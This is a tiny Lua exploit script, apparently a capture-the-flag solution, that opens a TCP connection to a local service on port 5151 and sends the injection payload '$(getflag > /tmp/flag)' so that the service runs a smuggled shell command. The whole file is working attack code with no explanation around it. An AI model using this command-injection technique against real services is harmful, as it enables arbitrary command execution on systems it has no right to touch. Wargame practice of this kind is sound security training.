#!/usr/bin/env lua
local host, port = "127.0.0.1", 5151
local socket = require("socket")
local tcp = assert(socket.tcp())

tcp:connect(host, port);
--note the newline below
tcp:send("$(getflag > /tmp/flag)\n");

tcp:close()
